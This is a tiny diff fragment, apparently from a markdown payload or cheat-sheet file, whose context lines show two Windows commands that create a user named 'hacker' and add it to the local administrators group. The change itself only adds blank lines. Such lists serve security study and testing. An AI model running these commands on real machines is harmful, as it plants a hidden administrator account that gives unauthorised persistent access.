@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:00.790175+00:00'
 net user hacker Password123! /add
 net localgroup administrators /add hacker
 ```
+
+
